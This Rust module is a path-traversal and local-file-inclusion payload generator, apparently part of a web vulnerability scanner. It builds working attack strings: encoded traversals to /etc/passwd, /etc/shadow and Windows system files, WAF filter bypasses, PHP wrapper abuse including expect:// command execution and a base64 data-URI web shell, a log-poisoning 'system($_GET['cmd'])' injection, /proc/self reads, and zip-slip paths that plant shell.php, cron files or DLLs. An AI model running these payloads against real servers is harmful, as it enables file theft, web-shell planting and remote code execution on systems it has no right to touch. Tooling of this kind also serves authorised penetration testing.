//! Advanced path traversal and Local File Inclusion (LFI) payload engine.
//!
//! Generates encoding-ladder payloads, OS-aware targets, filter bypasses,
//! PHP wrapper abuse, log poisoning vectors, /proc/self/ exploitation,
//! zip-slip archive traversals, and NTFS alternate data stream attacks.

use std::collections::HashSet;

// ---------------------------------------------------------------------------
// Public types
// ---------------------------------------------------------------------------

/// Target operating system for payload generation.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum TargetOs {
    Linux,
    Windows,
}

/// Category of a generated payload.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum PayloadCategory {
    /// Classic directory traversal with encoding ladder.
    DirectoryTraversal,
    /// Bypasses for common WAF / input filters.
    FilterBypass,
    /// PHP stream wrapper abuse (php://filter, expect://, etc.).
    PhpWrapper,
    /// Log poisoning via User-Agent injection then LFI include.
    LogPoisoning,
    /// /proc/self/ information disclosure on Linux.
    ProcSelf,
    /// Zip-slip style archive directory traversal.
    ArchiveTraversal,
    /// NTFS alternate data streams and path normalisation tricks.
    PathNormalization,
}

/// Encoding technique applied to the traversal sequence.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum EncodingLevel {
    Plain,
    UrlEncoded,
    DoubleUrlEncoded,
    UnicodeEncoded,
    OverlongUtf8,
    NullByte,
    /// Mixed: combines URL-encoding with null byte suffix.
    UrlEncodedNullByte,
    /// UTF-8 overlong with double-URL encoding.
    OverlongDoubleUrl,
}

/// A single generated payload with metadata.
#[derive(Debug, Clone, PartialEq, Eq, Hash)]
pub struct TraversalPayload {
    pub value: String,
    pub category: PayloadCategory,
    pub encoding: EncodingLevel,
    pub target_os: TargetOs,
    pub description: String,
}

// ---------------------------------------------------------------------------
// Configuration
// ---------------------------------------------------------------------------

/// Controls which payload families the engine emits.
#[derive(Debug, Clone)]
pub struct TraversalConfig {
    pub target_os: TargetOs,
    pub traversal_depth: usize,
    pub include_php_wrappers: bool,
    pub include_log_poisoning: bool,
    pub include_proc_self: bool,
    pub include_archive_traversal: bool,
    pub include_path_normalization: bool,
}

impl Default for TraversalConfig {
    fn default() -> Self {
        Self {
            target_os: TargetOs::Linux,
            traversal_depth: 8,
            include_php_wrappers: true,
            include_log_poisoning: true,
            include_proc_self: true,
            include_archive_traversal: true,
            include_path_normalization: true,
        }
    }
}

impl TraversalConfig {
    pub fn with_os(mut self, os: TargetOs) -> Self {
        self.target_os = os;
        self
    }

    pub fn with_depth(mut self, depth: usize) -> Self {
        self.traversal_depth = depth;
        self
    }

    pub fn with_php_wrappers(mut self, enabled: bool) -> Self {
        self.include_php_wrappers = enabled;
        self
    }

    pub fn with_log_poisoning(mut self, enabled: bool) -> Self {
        self.include_log_poisoning = enabled;
        self
    }

    pub fn with_proc_self(mut self, enabled: bool) -> Self {
        self.include_proc_self = enabled;
        self
    }

    pub fn with_archive_traversal(mut self, enabled: bool) -> Self {
        self.include_archive_traversal = enabled;
        self
    }

    pub fn with_path_normalization(mut self, enabled: bool) -> Self {
        self.include_path_normalization = enabled;
        self
    }
}

// ---------------------------------------------------------------------------
// Engine
// ---------------------------------------------------------------------------

/// Stateless engine that produces traversal/LFI payloads from a config.
pub struct PathTraversalEngine;

impl PathTraversalEngine {
    /// Generate all payloads matching the supplied configuration.
    pub fn generate(config: &TraversalConfig) -> Vec<TraversalPayload> {
        let mut payloads = Vec::with_capacity(128);
        let mut seen = HashSet::new();

        Self::add_directory_traversals(config, &mut payloads, &mut seen);
        Self::add_filter_bypasses(config, &mut payloads, &mut seen);

        if config.include_php_wrappers {
            Self::add_php_wrappers(config, &mut payloads, &mut seen);
        }
        if config.include_log_poisoning {
            Self::add_log_poisoning(config, &mut payloads, &mut seen);
        }
        if config.include_proc_self && config.target_os == TargetOs::Linux {
            Self::add_proc_self(&mut payloads, &mut seen);
        }
        if config.include_archive_traversal {
            Self::add_archive_traversals(config, &mut payloads, &mut seen);
        }
        if config.include_path_normalization {
            Self::add_path_normalization(config, &mut payloads, &mut seen);
        }

        payloads
    }

    /// Detect OS from a server header value (heuristic).
    pub fn detect_os(server_header: &str) -> TargetOs {
        let lower = server_header.to_ascii_lowercase();
        if lower.contains("win") || lower.contains("iis") || lower.contains("microsoft") {
            TargetOs::Windows
        } else {
            TargetOs::Linux
        }
    }

    // -----------------------------------------------------------------------
    // Directory traversal with encoding ladder
    // -----------------------------------------------------------------------

    fn sensitive_targets(os: TargetOs) -> Vec<(&'static str, &'static str)> {
        match os {
            TargetOs::Linux => vec![
                ("/etc/passwd", "Unix password file"),
                ("/etc/shadow", "Unix shadow password file"),
                ("/etc/hosts", "Hosts file"),
                ("/proc/self/environ", "Process environment variables"),
            ],
            TargetOs::Windows => vec![
                ("C:\\Windows\\win.ini", "Windows INI file"),
                (
                    "C:\\Windows\\System32\\drivers\\etc\\hosts",
                    "Windows hosts file",
                ),
                ("C:\\boot.ini", "Windows boot config"),
                ("C:\\Windows\\system.ini", "Windows system INI"),
            ],
        }
    }

    fn traversal_prefix(depth: usize, os: TargetOs) -> String {
        let sep = match os {
            TargetOs::Linux => "/",
            TargetOs::Windows => "\\",
        };
        let dot_dot = format!("..{sep}");
        dot_dot.repeat(depth)
    }

    fn apply_encoding(raw: &str, level: EncodingLevel) -> String {
        match level {
            EncodingLevel::Plain => raw.to_string(),
            EncodingLevel::UrlEncoded => raw
                .replace('/', "%2f")
                .replace('\\', "%5c")
                .replace('.', "%2e"),
            EncodingLevel::DoubleUrlEncoded => raw
                .replace('/', "%252f")
                .replace('\\', "%255c")
                .replace('.', "%252e"),
            EncodingLevel::UnicodeEncoded => raw
                .replace('/', "%c0%af")
                .replace('\\', "%c1%9c")
                .replace('.', "%u002e"),
            EncodingLevel::OverlongUtf8 => raw
                .replace('/', "%c0%af")
                .replace('\\', "%c1%9c")
                .replace('.', "%c0%ae"),
            EncodingLevel::NullByte => format!("{raw}%00"),
            EncodingLevel::UrlEncodedNullByte => {
                let encoded = raw
                    .replace('/', "%2f")
                    .replace('\\', "%5c")
                    .replace('.', "%2e");
                format!("{encoded}%00")
            }
            EncodingLevel::OverlongDoubleUrl => raw
                .replace('/', "%25c0%25af")
                .replace('\\', "%25c1%259c")
                .replace('.', "%25c0%25ae"),
        }
    }

    fn encoding_ladder() -> Vec<EncodingLevel> {
        vec![
            EncodingLevel::Plain,
            EncodingLevel::UrlEncoded,
            EncodingLevel::DoubleUrlEncoded,
            EncodingLevel::UnicodeEncoded,
            EncodingLevel::OverlongUtf8,
            EncodingLevel::NullByte,
            EncodingLevel::UrlEncodedNullByte,
            EncodingLevel::OverlongDoubleUrl,
        ]
    }

    fn push_unique(
        payload: TraversalPayload,
        payloads: &mut Vec<TraversalPayload>,
        seen: &mut HashSet<String>,
    ) {
        if seen.insert(payload.value.clone()) {
            payloads.push(payload);
        }
    }

    fn add_directory_traversals(
        config: &TraversalConfig,
        payloads: &mut Vec<TraversalPayload>,
        seen: &mut HashSet<String>,
    ) {
        let targets = Self::sensitive_targets(config.target_os);
        let prefix = Self::traversal_prefix(config.traversal_depth, config.target_os);

        for (target, desc) in &targets {
            let raw = if config.target_os == TargetOs::Windows {
                // Windows targets already have drive letter — just use depth prefix
                format!(
                    "{}{}",
                    Self::traversal_prefix(config.traversal_depth, config.target_os),
                    target.trim_start_matches("C:\\")
                )
            } else {
                format!("{prefix}{}", target.trim_start_matches('/'))
            };

            for enc in Self::encoding_ladder() {
                let encoded = Self::apply_encoding(&raw, enc);
                Self::push_unique(
                    TraversalPayload {
                        value: encoded,
                        category: PayloadCategory::DirectoryTraversal,
                        encoding: enc,
                        target_os: config.target_os,
                        description: format!("Traversal to {desc} ({enc:?})"),
                    },
                    payloads,
                    seen,
                );
            }
        }
    }

    // -----------------------------------------------------------------------
    // Filter bypasses
    // -----------------------------------------------------------------------

    fn add_filter_bypasses(
        config: &TraversalConfig,
        payloads: &mut Vec<TraversalPayload>,
        seen: &mut HashSet<String>,
    ) {
        let target = match config.target_os {
            TargetOs::Linux => "etc/passwd",
            TargetOs::Windows => "Windows\\win.ini",
        };

        let bypass_prefixes: Vec<(&str, &str)> = vec![
            ("..;/", "Tomcat semicolon bypass"),
            ("....//", "Double-dot double-slash bypass"),
            ("..%00/", "Null byte mid-path bypass"),
            ("..%0d%0a/", "CRLF injection bypass"),
            ("/%5C../", "Backslash-encoded bypass"),
            ("..%252f", "Double-URL-encoded slash bypass"),
            ("..\\/", "Mixed separator bypass"),
            ("..%c0%af", "Overlong UTF-8 slash bypass"),
            ("....\\\\", "Double-dot double-backslash bypass"),
            ("/..../", "Extra dots bypass"),
            (".%2e/", "Partial dot encoding bypass"),
            ("%2e%2e/", "Full dot encoding bypass"),
            ("%2e%2e%2f", "Full traversal encoding bypass"),
        ];

        let depth = config.traversal_depth;

        for (prefix, desc) in &bypass_prefixes {
            let traversal = prefix.repeat(depth);
            let value = format!("{traversal}{target}");
            Self::push_unique(
                TraversalPayload {
                    value,
                    category: PayloadCategory::FilterBypass,
                    encoding: EncodingLevel::Plain,
                    target_os: config.target_os,
                    description: (*desc).to_string(),
                },
                payloads,
                seen,
            );
        }
    }

    // -----------------------------------------------------------------------
    // PHP wrappers
    // -----------------------------------------------------------------------

    fn add_php_wrappers(
        _config: &TraversalConfig,
        payloads: &mut Vec<TraversalPayload>,
        seen: &mut HashSet<String>,
    ) {
        let wrappers: Vec<(&str, &str)> = vec![
            (
                "php://filter/convert.base64-encode/resource=index.php",
                "Base64 source leak via php://filter",
            ),
            (
                "php://filter/read=string.rot13/resource=index.php",
                "ROT13 source leak via php://filter",
            ),
            (
                "php://filter/convert.iconv.utf-8.utf-16/resource=index.php",
                "Iconv encoding source leak via php://filter",
            ),
            (
                "php://input",
                "Direct code execution via php://input POST body",
            ),
            ("expect://id", "Command execution via expect:// wrapper"),
            (
                "zip://uploads/shell.jpg%23payload.php",
                "Zip archive wrapper code execution",
            ),
            (
                "phar://uploads/shell.phar/payload.php",
                "Phar archive deserialization exploit",
            ),
            (
                "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==",
                "Data URI inline PHP execution",
            ),
            (
                "php://filter/convert.base64-encode/resource=/etc/passwd",
                "Base64 /etc/passwd via php://filter",
            ),
            (
                "php://filter/zlib.deflate/convert.base64-encode/resource=index.php",
                "Compressed + base64 source leak via php://filter chain",
            ),
        ];

        for (value, desc) in wrappers {
            Self::push_unique(
                TraversalPayload {
                    value: value.to_string(),
                    category: PayloadCategory::PhpWrapper,
                    encoding: EncodingLevel::Plain,
                    target_os: TargetOs::Linux,
                    description: desc.to_string(),
                },
                payloads,
                seen,
            );
        }
    }

    // -----------------------------------------------------------------------
    // Log poisoning
    // -----------------------------------------------------------------------

    fn add_log_poisoning(
        config: &TraversalConfig,
        payloads: &mut Vec<TraversalPayload>,
        seen: &mut HashSet<String>,
    ) {
        let log_paths: Vec<(&str, &str, TargetOs)> = vec![
            (
                "/var/log/apache2/access.log",
                "Apache access log",
                TargetOs::Linux,
            ),
            (
                "/var/log/nginx/access.log",
                "Nginx access log",
                TargetOs::Linux,
            ),
            (
                "/var/log/httpd/access_log",
                "HTTPD access log",
                TargetOs::Linux,
            ),
            (
                "C:\\xampp\\apache\\logs\\access.log",
                "XAMPP Apache access log",
                TargetOs::Windows,
            ),
        ];

        let prefix = Self::traversal_prefix(config.traversal_depth, config.target_os);

        for (path, desc, os) in &log_paths {
            if *os != config.target_os {
                continue;
            }
            let stripped = match os {
                TargetOs::Linux => path.trim_start_matches('/'),
                TargetOs::Windows => path.trim_start_matches("C:\\"),
            };
            let value = format!("{prefix}{stripped}");
            Self::push_unique(
                TraversalPayload {
                    value,
                    category: PayloadCategory::LogPoisoning,
                    encoding: EncodingLevel::Plain,
                    target_os: config.target_os,
                    description: format!("Log poisoning via {desc}"),
                },
                payloads,
                seen,
            );
        }

        // User-Agent injection payload (the companion request the attacker sends first).
        Self::push_unique(
            TraversalPayload {
                value: "<?php system($_GET['cmd']); ?>".to_string(),
                category: PayloadCategory::LogPoisoning,
                encoding: EncodingLevel::Plain,
                target_os: config.target_os,
                description: "User-Agent PHP injection for log poisoning".to_string(),
            },
            payloads,
            seen,
        );
    }

    // -----------------------------------------------------------------------
    // /proc/self/ exploitation
    // -----------------------------------------------------------------------

    fn add_proc_self(payloads: &mut Vec<TraversalPayload>, seen: &mut HashSet<String>) {
        let proc_targets: Vec<(&str, &str)> = vec![
            ("/proc/self/environ", "Process environment variables"),
            ("/proc/self/cmdline", "Process command line"),
            ("/proc/self/fd/0", "Standard input file descriptor"),
            ("/proc/self/fd/1", "Standard output file descriptor"),
            ("/proc/self/fd/2", "Standard error file descriptor"),
            ("/proc/self/maps", "Memory mappings (ASLR leak)"),
            ("/proc/self/status", "Process status information"),
            ("/proc/self/cwd", "Current working directory symlink"),
            ("/proc/version", "Kernel version"),
            ("/proc/self/exe", "Symlink to process binary"),
        ];

        for (path, desc) in &proc_targets {
            Self::push_unique(
                TraversalPayload {
                    value: (*path).to_string(),
                    category: PayloadCategory::ProcSelf,
                    encoding: EncodingLevel::Plain,
                    target_os: TargetOs::Linux,
                    description: format!("/proc info disclosure: {desc}"),
                },
                payloads,
                seen,
            );
        }
    }

    // -----------------------------------------------------------------------
    // Archive (zip-slip) traversals
    // -----------------------------------------------------------------------

    fn add_archive_traversals(
        config: &TraversalConfig,
        payloads: &mut Vec<TraversalPayload>,
        seen: &mut HashSet<String>,
    ) {
        let targets: Vec<(&str, TargetOs)> = vec![
            ("etc/cron.d/malicious", TargetOs::Linux),
            ("etc/passwd", TargetOs::Linux),
            ("var/www/html/shell.php", TargetOs::Linux),
            ("tmp/evil.sh", TargetOs::Linux),
            ("Windows\\System32\\evil.dll", TargetOs::Windows),
            ("inetpub\\wwwroot\\shell.aspx", TargetOs::Windows),
        ];

        for (target, os) in &targets {
            if *os != config.target_os {
                continue;
            }
            let sep = match os {
                TargetOs::Linux => "/",
                TargetOs::Windows => "\\",
            };
            let prefix = format!("..{sep}").repeat(config.traversal_depth);
            let value = format!("{prefix}{target}");
            Self::push_unique(
                TraversalPayload {
                    value,
                    category: PayloadCategory::ArchiveTraversal,
                    encoding: EncodingLevel::Plain,
                    target_os: config.target_os,
                    description: format!("Zip-slip to {target}"),
                },
                payloads,
                seen,
            );
        }
    }

    // -----------------------------------------------------------------------
    // Path normalization / NTFS ADS
    // -----------------------------------------------------------------------

    fn add_path_normalization(
        config: &TraversalConfig,
        payloads: &mut Vec<TraversalPayload>,
        seen: &mut HashSet<String>,
    ) {
        match config.target_os {
            TargetOs::Windows => {
                let ntfs_payloads: Vec<(&str, &str)> = vec![
                    (
                        "....\\....\\....\\....\\Windows\\win.ini",
                        "4-dot backslash normalization",
                    ),
                    (
                        "..\\..\\..\\..\\Windows\\win.ini::$DATA",
                        "NTFS alternate data stream",
                    ),
                    (
                        "..\\..\\..\\..\\Windows\\win.ini.",
                        "Trailing dot normalization",
                    ),
                    (
                        "..\\..\\..\\..\\Windows\\win.ini...",
                        "Multiple trailing dots normalization",
                    ),
                    (
                        "..\\..\\..\\..\\Windows\\win.ini:$INDEX_ALLOCATION",
                        "NTFS $INDEX_ALLOCATION stream",
                    ),
                    (
                        "..%5c..%5c..%5c..%5cWindows%5cwin.ini",
                        "URL-encoded backslash traversal",
                    ),
                    (
                        "..%255c..%255c..%255c..%255cWindows%255cwin.ini",
                        "Double-encoded backslash traversal",
                    ),
                    (
                        "\\\\?\\C:\\Windows\\win.ini",
                        "Extended-length UNC path bypass",
                    ),
                ];

                for (value, desc) in ntfs_payloads {
                    Self::push_unique(
                        TraversalPayload {
                            value: value.to_string(),
                            category: PayloadCategory::PathNormalization,
                            encoding: EncodingLevel::Plain,
                            target_os: TargetOs::Windows,
                            description: desc.to_string(),
                        },
                        payloads,
                        seen,
                    );
                }
            }
            TargetOs::Linux => {
                let linux_norm_payloads: Vec<(&str, &str)> = vec![
                    ("/etc/passwd/./././.", "Redundant current-dir segments"),
                    ("//etc////passwd", "Multiple slash normalization"),
                    ("/etc/./passwd", "Single dot segment in path"),
                    ("/etc/security/../passwd", "Up-and-over normalization"),
                ];

                for (value, desc) in linux_norm_payloads {
                    Self::push_unique(
                        TraversalPayload {
                            value: value.to_string(),
                            category: PayloadCategory::PathNormalization,
                            encoding: EncodingLevel::Plain,
                            target_os: TargetOs::Linux,
                            description: desc.to_string(),
                        },
                        payloads,
                        seen,
                    );
                }
            }
        }
    }
}

#[cfg(test)]
#[path = "path_traversal_engine_test.rs"]
mod path_traversal_engine_test;
